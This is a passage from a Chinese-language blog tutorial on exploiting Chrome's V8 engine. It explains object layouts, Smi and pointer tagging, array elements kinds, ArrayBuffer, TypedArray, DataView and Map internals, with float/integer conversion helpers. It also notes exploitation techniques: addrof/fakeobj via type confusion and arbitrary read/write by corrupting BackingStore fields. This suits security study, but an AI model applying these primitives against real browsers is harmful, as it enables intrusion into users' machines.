[DictionaryProperties]</span><br><span class="line"> - prototype: 0x1b0fcc042091 &lt;Object map = 0x39d6446c0229&gt;</span><br><span class="line"> - elements: 0x37815f38bc29 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x37815f38bd01 &lt;NameDictionary[17]&gt; &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bc29 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           1: 0x1b0fcc05f551 &lt;String[#1]: B&gt;</span><br><span class="line">           2: 0x1b0fcc05f581 &lt;String[#1]: C&gt;</span><br><span class="line">        3-18: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/54ccd1274efaf3d69751016075870e1a.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Fast-Elements-Dictionary-Elements"><a href="#Fast-Elements-Dictionary-Elements" class="headerlink" title="Fast Elements &amp; Dictionary Elements"></a>Fast Elements &amp; Dictionary Elements</h3><p><code>Fast Elements</code> 和 <code>Dictionary Elements</code> 的区别是存储方式是线性保存还是词典保存。 <code>Dictionary Elements</code> 主要用于 <code>Holey Element</code> 特别多的情况。</p>
<h1 id="常见类型结构"><a href="#常见类型结构" class="headerlink" title="常见类型结构"></a>常见类型结构</h1><p>处理通用对象外，v8 还内置了一些常见类型。</p>
<p>在 v8 源码的 <code>v8/src/objects/objects.h</code> 中有对 v8 各种类型之间继承关系的描述。</p>
<blockquote>
<p> Most object types in the V8 JavaScript are described in this file.</p>
<p> Inheritance hierarchy:</p>
<ul>
<li>Object<ul>
<li>Smi          (immediate small integer)</li>
<li>TaggedIndex  (properly sign-extended immediate small integer)</li>
<li>HeapObject   (superclass for everything allocated in the heap)<ul>
<li>JSReceiver  (suitable for property access)<ul>
<li>JSObject<ul>
<li>JSArray<ul>
<li>TemplateLiteralObject</li>
</ul>
</li>
<li>JSArrayBuffer</li>
<li>JSArrayBufferView<ul>
<li>JSTypedArray</li>
<li>JSDataView</li>
</ul>
</li>
<li>JSCollection<ul>
<li>JSSet</li>
<li>JSMap</li>
</ul>
</li>
<li>JSCustomElementsObject (may have elements despite empty FixedArray)<ul>
<li>JSSpecialObject (requires custom property lookup handling)<ul>
<li>JSGlobalObject</li>
<li>JSGlobalProxy</li>
<li>JSModuleNamespace</li>
</ul>
</li>
<li>JSPrimitiveWrapper</li>
</ul>
</li>
<li>JSDate</li>
<li>JSFunctionOrBoundFunctionOrWrappedFunction<ul>
<li>JSBoundFunction</li>
<li>JSFunction</li>
<li>JSWrappedFunction</li>
</ul>
</li>
<li>JSGeneratorObject</li>
<li>JSMapIterator</li>
<li>JSMessageObject</li>
<li>JSRegExp</li>
<li>JSSetIterator</li>
<li>JSShadowRealm</li>
<li>JSSharedStruct</li>
<li>JSStringIterator</li>
<li>JSTemporalCalendar</li>
<li>JSTemporalDuration</li>
<li>JSTemporalInstant</li>
<li>JSTemporalPlainDate</li>
<li>JSTemporalPlainDateTime</li>
<li>JSTemporalPlainMonthDay</li>
<li>JSTemporalPlainTime</li>
<li>JSTemporalPlainYearMonth</li>
<li>JSTemporalTimeZone</li>
<li>JSTemporalZonedDateTime</li>
<li>JSWeakCollection<ul>
<li>JSWeakMap</li>
<li>JSWeakSet</li>
</ul>
</li>
<li>JSCollator            &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSDateTimeFormat      &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSDisplayNames        &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSDurationFormat      &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSListFormat          &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSLocale              &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSNumberFormat        &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSPluralRules         &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSRelativeTimeFormat  &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSSegmenter           &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSSegments            &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSSegmentIterator     &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSV8BreakIterator     &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>WasmExceptionPackage</li>
<li>WasmTagObject</li>
<li>WasmGlobalObject</li>
<li>WasmInstanceObject</li>
<li>WasmMemoryObject</li>
<li>WasmModuleObject</li>
<li>WasmTableObject</li>
<li>WasmSuspenderObject</li>
</ul>
</li>
<li>JSProxy</li>
</ul>
</li>
<li>FixedArrayBase<ul>
<li>ByteArray</li>
<li>BytecodeArray</li>
<li>FixedArray<ul>
<li>HashTable<ul>
<li>Dictionary</li>
<li>StringTable</li>
<li>StringSet</li>
<li>CompilationCacheTable</li>
<li>MapCache</li>
</ul>
</li>
<li>OrderedHashTable<ul>
<li>OrderedHashSet</li>
<li>OrderedHashMap</li>
</ul>
</li>
<li>FeedbackMetadata</li>
<li>TemplateList</li>
<li>TransitionArray</li>
<li>ScopeInfo</li>
<li>SourceTextModuleInfo</li>
<li>ScriptContextTable</li>
<li>ClosureFeedbackCellArray</li>
</ul>
</li>
<li>FixedDoubleArray</li>
</ul>
</li>
<li>PrimitiveHeapObject<ul>
<li>BigInt</li>
<li>HeapNumber</li>
<li>Name<ul>
<li>String<ul>
<li>SeqString<ul>
<li>SeqOneByteString</li>
<li>SeqTwoByteString</li>
</ul>
</li>
<li>SlicedString</li>
<li>ConsString</li>
<li>ThinString</li>
<li>ExternalString<ul>
<li>ExternalOneByteString</li>
<li>ExternalTwoByteString</li>
</ul>
</li>
<li>InternalizedString<ul>
<li>SeqInternalizedString<ul>
<li>SeqOneByteInternalizedString</li>
<li>SeqTwoByteInternalizedString</li>
</ul>
</li>
<li>ConsInternalizedString</li>
<li>ExternalInternalizedString<ul>
<li>ExternalOneByteInternalizedString</li>
<li>ExternalTwoByteInternalizedString</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Symbol</li>
</ul>
</li>
<li>Oddball</li>
</ul>
</li>
<li>Context<ul>
<li>NativeContext</li>
</ul>
</li>
<li>Cell</li>
<li>DescriptorArray</li>
<li>PropertyCell</li>
<li>PropertyArray</li>
<li>InstructionStream</li>
<li>AbstractCode, a wrapper around Code or BytecodeArray</li>
<li>GcSafeCode, a wrapper around Code</li>
<li>Map</li>
<li>Foreign</li>
<li>SmallOrderedHashTable<ul>
<li>SmallOrderedHashMap</li>
<li>SmallOrderedHashSet</li>
</ul>
</li>
<li>SharedFunctionInfo</li>
<li>Struct<ul>
<li>AccessorInfo</li>
<li>AsmWasmData</li>
<li>PromiseReaction</li>
<li>PromiseCapability</li>
<li>AccessorPair</li>
<li>AccessCheckInfo</li>
<li>InterceptorInfo</li>
<li>CallHandlerInfo</li>
<li>EnumCache</li>
<li>TemplateInfo<ul>
<li>FunctionTemplateInfo</li>
<li>ObjectTemplateInfo</li>
</ul>
</li>
<li>Script</li>
<li>DebugInfo</li>
<li>BreakPoint</li>
<li>BreakPointInfo</li>
<li>CallSiteInfo</li>
<li>CodeCache</li>
<li>PropertyDescriptorObject</li>
<li>PromiseOnStack</li>
<li>PrototypeInfo</li>
<li>Microtask<ul>
<li>CallbackTask</li>
<li>CallableTask</li>
<li>PromiseReactionJobTask<ul>
<li>PromiseFulfillReactionJobTask</li>
<li>PromiseRejectReactionJobTask</li>
</ul>
</li>
<li>PromiseResolveThenableJobTask</li>
</ul>
</li>
<li>Module<ul>
<li>SourceTextModule</li>
<li>SyntheticModule</li>
</ul>
</li>
<li>SourceTextModuleInfoEntry</li>
<li>StackFrameInfo</li>
</ul>
</li>
<li>FeedbackCell</li>
<li>FeedbackVector</li>
<li>PreparseData</li>
<li>UncompiledData<ul>
<li>UncompiledDataWithoutPreparseData</li>
<li>UncompiledDataWithPreparseData</li>
</ul>
</li>
<li>SwissNameDictionary</li>
</ul>
</li>
</ul>
</li>
</ul>
<p> Formats of Object::ptr_:   Smi:        [31 bit signed int] 0<br> HeapObject: [32 bit direct pointer] (4 byte aligned) | 01</p>
</blockquote>
<h2 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h2><p>所有不超过 0x7FFFFFFF 的整数都以 <code>Smi</code> 的形式存储。</p>
<ul>
<li>在 32 位上可以表示有符号的 31 位的整数，通过右移一位可以获得原始值。<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/ae233d26782a49735319c7940496238c.png" >https://i-blog.csdnimg.cn/blog_migrate/ae233d26782a49735319c7940496238c.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;30%x)	</li>
<li>在 64 位上可以表示有符号的32位的整数，通过右移 32 位可以获得原始值<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/c30841e50e497ec96739d3edc71fed5f.png" >https://i-blog.csdnimg.cn/blog_migrate/c30841e50e497ec96739d3edc71fed5f.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</li>
</ul>
<h2 id="HeapObject-指针"><a href="#HeapObject-指针" class="headerlink" title="HeapObject 指针"></a>HeapObject 指针</h2><p>最低位为 1 表示指向 <code>HeapObject</code> 的指针。</p>
<ul>
<li>32 位<br>  ![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/582ef8279deb472ca013ef9053ded720.png" >https://i-blog.csdnimg.cn/blog_migrate/582ef8279deb472ca013ef9053ded720.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</li>
<li>64位	<br> ![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/f90c4d59d4c6283024b03acd9096a47b.png" >https://i-blog.csdnimg.cn/blog_migrate/f90c4d59d4c6283024b03acd9096a47b.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</li>
</ul>
<h2 id="Heap-Number"><a href="#Heap-Number" class="headerlink" title="Heap Number"></a>Heap Number</h2><p>表示不能在 <code>Smi</code> 范围内表⽰的整数，均以 double 值的形式保存在 <code>Heap Number</code> 的 <code>Value</code> 里。<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/2603f1a7f65fcda2dc4cfd0c167abd43.png" >https://i-blog.csdnimg.cn/blog_migrate/2603f1a7f65fcda2dc4cfd0c167abd43.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</p>
<h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><p>保存字符串对象，具体结构各版本之间可能存在差异。<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/6843b54efe0c93343146abc1ca48869c.png" >https://i-blog.csdnimg.cn/blog_migrate/6843b54efe0c93343146abc1ca48869c.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</p>
<h2 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h2><p>继承自 <code>Object</code> ，<code>HeapObject</code> ，<code>JSReceiver</code> 。<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/c92fe3233ac7844836598061c02f0ec5.png" >https://i-blog.csdnimg.cn/blog_migrate/c92fe3233ac7844836598061c02f0ec5.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;80%x)<br>v8 的 <code>JSArray</code> 遵循图中格的变化，从左到右，从上到下，不可逆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a304a5a6054e7c0085783876f4d2f007.png"
                      alt="在这里插入图片描述"
                ></p>
<p>规律：</p>
<ul>
<li>存在 <code>Smi</code> 和浮点数则都用浮点数表示</li>
<li>存在 <code>Object</code> 类型则都用 <code>Object</code> 类型表示。</li>
<li><code>elements</code> 之间空隙过大转为字典存储。</li>
</ul>
<p>在实际的漏洞利用中，我们常构造出 double array 和 obj array 的类型混淆，从而构建 addrof 和 fakeobj 原语。</p>
<h2 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h2><p><code>JSArrayBuffer</code> ，顾名思义，就是保存有⼀个被称作 <code>BackingStore</code> 的 buffer 的对象。<br>在 V8 中，对象通常被存放在由 V8 GC 管理的 mapped 区域，然而 <code>BackingStore</code> 是⼀个不被 V8 GC 管理的区域，(事实上它在 Chrome 里是由 PartitionAlloc 来管理，在 d8 里则是用 ptmalloc 来模拟管理)，此外，由于它不是由 GC 管理的 <code>HeapObject</code> ，因 此指向 <code>BackingStore</code> 的指针不是 <code>Tagged Value</code>（末尾不能为1）。<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/dc99cfff31fb6bf83e791fc23fb4702e.png" >https://i-blog.csdnimg.cn/blog_migrate/dc99cfff31fb6bf83e791fc23fb4702e.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;80%x)</p>
<ul>
<li>虽然在 <code>ArrayBuffer</code> 中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出 <code>BackingStore</code> 数组的范围。<br>同样，如果也可以重写 <code>BackingStore</code> 指针，则可以读取和写入任意内存地址，这些是在 exploit 中常用的方法。</li>
</ul>
<h2 id="JSTypedArray"><a href="#JSTypedArray" class="headerlink" title="JSTypedArray"></a>JSTypedArray</h2><p>由于 <code>JSArrayBuffer</code> 实际上只是持有 <code>BackingStore</code> 指针的对象，换句话说，它只是⼀个 buffer ，所以在 js 的设计⾥，对 <code>BackStore</code> 的读写需要依赖于 <code>TypedArray</code> 或者 <code>DataView</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2c6b74b6162897cfdaeac0710e4ab8fa.png"
                      alt="在这里插入图片描述"
                ><br>在漏洞利用时通常使用 <code>JSTypedArray</code> 进行整型和浮点数类型的转换。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"><span class="keyword">var</span> i64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> i64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    i64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let val = &quot;0x1145141919810&quot;;</span></span><br><span class="line"><span class="keyword">let</span> val = <span class="number">0x1145141919810n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(val));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="title function_">u2d</span>(val))));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.501041597677047e-309</span></span><br><span class="line"><span class="comment">// 0x0001145141919810</span></span><br></pre></td></tr></table></figure></div>

<h2 id="JSDataView"><a href="#JSDataView" class="headerlink" title="JSDataView"></a>JSDataView</h2><p>也是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 的内容的对象，在 exploit 里常用作最后的任意地址读写原语的构造。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a9646d8acb9db82a8299671d179052f1.png"
                      alt="在这里插入图片描述"
                ><br>利用 <code>JDataView</code> 实现的类型转换：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> val = <span class="number">0x1145141919810n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(val));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="title function_">u2d</span>(val))));</span><br></pre></td></tr></table></figure></div>

<h2 id="JSMap"><a href="#JSMap" class="headerlink" title="JSMap"></a>JSMap</h2><p><code>JSMap</code> 是一种可以按照添加顺序遍历其中元素的 Hash Map ，即 <code>OrderedHashMap</code>。在 V8 漏洞利用中常与 Hole 类型漏洞结合使用。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></div>
<p>以 <code>9.5.172</code> 版本 V8 为例，<code>OrderedHashMap</code> 的查看方式如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/fcff33b0bb8c869c3094c13b2e01494b.png"
                      alt="在这里插入图片描述"
                ><br>这里解释一下各个字段的含义：</p>
<ul>
<li><code>FixedArray length</code>：是 V8 在访问 <code>OrderedHashMap</code> 时会将整个 <code>OrderedHashMap</code> 看作一个 <code>Array</code>，这个就是 <code>Array</code> 的长度。即除去 <code>Map</code> 和 <code>FixedArray length</code> 外的部分的长度的字节数除以 4 。</li>
<li><code>elements</code>：<code>Map</code> 中的 <code>key</code> 的数量。</li>
<li><code>delete</code>：<code>Map</code> 中删除的元素数量，也就是当前 <code>Map</code> 中 <code>Hole</code> 的数量。</li>
<li><code>buckets(smi)</code>：后面 <code>buckets(HashTable)</code> 的长度，通常是 2 的整数次幂。</li>
<li><code>capacity</code>：<code>elements</code> 区域能存放的 <code>Entry</code> 的数量。<code>capacity</code> 是 <code>buckets</code> 乘 2 计算出来的，在 <code>OrderedHashMap</code> 的内存区域中也没有体现。</li>
<li><code>buckets(HashTable)</code>：哈希表，在  <code>ComputeUnseededHash(key) &amp; (buckets - 1)</code> 计算出的位置上存放键值对在 <code>elements</code> 中的下标（实际是  <code>elements</code> 中的下标索引的一个单向链表）。该表默认填充为 -1 。</li>
<li><code>elements</code>：按照加入的顺序存放所有键值对组成的 <code>Entry</code> 。该表默认填充为 <code>undefine</code> 。</li>
</ul>
<p><strong>注意：在这个版本的 v8 中 32 位的 smi 不是左移 32 位而是左移 1 位，占用 4 字节。例如 1 表示为 0x00000002，-1 表示为 0xFFFFFFFE 。</strong></p>
<p><code>OrderedHashMap</code> 在内存中的分布大致如下图所示，其中每个格子的大小为 4 字节。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/bde9dfcca26eff4e11825181c59cd570.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set(key, value)</code> 是 <code>Map</code> 中用来设置键值对的方法，具体接口定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(MapPrototypeSet, CollectionsBuiltinsAssembler)</span><br></pre></td></tr></table></figure></div>

<p>这里假设 <code>key</code> 的类型为 <code>smi</code> ，首先 <code>TryLookupOrderedHashTableIndex</code> 查找 <code>key</code> 对应的 <code>Entry</code> ，从代码中可以看到 <code>JSMap</code> 使用的哈希函数 <code>ComputeUnseededHash</code> 。程序最终通过 <code>FindOrderedHashTableEntry</code> 查找 <code>key</code> 对应的 <code>Entry</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">TNode&lt;Word32T&gt; <span class="title">CollectionsBuiltinsAssembler::ComputeUnseededHash</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;IntPtrT&gt; key)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See v8::internal::ComputeUnseededHash()</span></span><br><span class="line">  TNode&lt;Word32T&gt; hash = <span class="built_in">TruncateIntPtrToInt32</span>(key);</span><br><span class="line">  hash = <span class="built_in">Int32Add</span>(<span class="built_in">Word32Xor</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">0xFFFFFFFF</span>)),</span><br><span class="line">                  <span class="built_in">Word32Shl</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">15</span>)));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">12</span>)));</span><br><span class="line">  hash = <span class="built_in">Int32Add</span>(hash, <span class="built_in">Word32Shl</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">2</span>)));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">4</span>)));</span><br><span class="line">  hash = <span class="built_in">Int32Mul</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">2057</span>));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">16</span>)));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Word32And</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">0x3FFFFFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::FindOrderedHashTableEntryForSmiKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;CollectionType&gt; table, TNode&lt;Smi&gt; smi_key, TVariable&lt;IntPtrT&gt;* result,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* entry_found, Label* not_found)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; key_untagged = <span class="built_in">SmiUntag</span>(smi_key);</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; hash =</span><br><span class="line">      <span class="built_in">ChangeInt32ToIntPtr</span>(<span class="built_in">ComputeUnseededHash</span>(key_untagged));</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IntPtrGreaterThanOrEqual</span>(hash, <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)));</span><br><span class="line">  *result = hash;</span><br><span class="line">  <span class="built_in">FindOrderedHashTableEntry</span>&lt;CollectionType&gt;(</span><br><span class="line">      table, hash,</span><br><span class="line">      [&amp;](TNode&lt;Object&gt; other_key, Label* if_same, Label* if_not_same) &#123;</span><br><span class="line">        <span class="built_in">SameValueZeroSmi</span>(smi_key, other_key, if_same, if_not_same);</span><br><span class="line">      &#125;,</span><br><span class="line">      result, entry_found, not_found);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::TryLookupOrderedHashTableIndex</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;CollectionType&gt; table, <span class="type">const</span> TNode&lt;Object&gt; key,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;IntPtrT&gt;* result, Label* if_entry_found, Label* if_not_found)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">BIND</span>(&amp;if_key_smi);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">FindOrderedHashTableEntryForSmiKey</span>&lt;CollectionType&gt;(</span><br><span class="line">        table, <span class="built_in">CAST</span>(key), result, if_entry_found, if_not_found);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TryLookupOrderedHashTableIndex</span>&lt;OrderedHashMap&gt;(</span><br><span class="line">      table, key, &amp;entry_start_position_or_hash, &amp;entry_found, &amp;not_found);</span><br></pre></td></tr></table></figure></div>

<p><code>FindOrderedHashTableEntry</code> 函数接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::FindOrderedHashTableEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;CollectionType&gt; table, <span class="type">const</span> TNode&lt;IntPtrT&gt; hash,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::function&lt;<span class="type">void</span>(TNode&lt;Object&gt;, Label*, Label*)&gt;&amp; key_compare,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;IntPtrT&gt;* entry_start_position, Label* entry_found,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* not_found)</span></span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>FindOrderedHashTableEntry</code> 首先计算出 <code>Key</code> 对应 <code>HashTable</code> 中的下标，这里是将前面计算出的 <code>key</code> 的哈希值与上 <code>number_of_buckets</code>，即 <code>ComputeUnseededHash(key) &amp; (buckets - 1)</code> 。最后的 <code>first_entry</code> 为 <code>HashTable</code> 该位置上的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_buckets =</span><br><span class="line">    <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">        table, CollectionType::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; bucket =</span><br><span class="line">    <span class="built_in">WordAnd</span>(hash, <span class="built_in">IntPtrSub</span>(number_of_buckets, <span class="built_in">IntPtrConstant</span>(<span class="number">1</span>)));</span><br><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; first_entry = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">    table, bucket, CollectionType::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize)));</span><br></pre></td></tr></table></figure></div>

<p>之后循环遍历链表，直到找到 <code>key</code> 对应的 <code>entry</code> 或者找到 <code>CollectionType::kNotFound</code> 。</p>
<p><strong>这里注意到在遍历链表时有检查，因此在漏洞利用时应避免遍历链表的操作，即 <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 应该为 -1 。</strong></p>
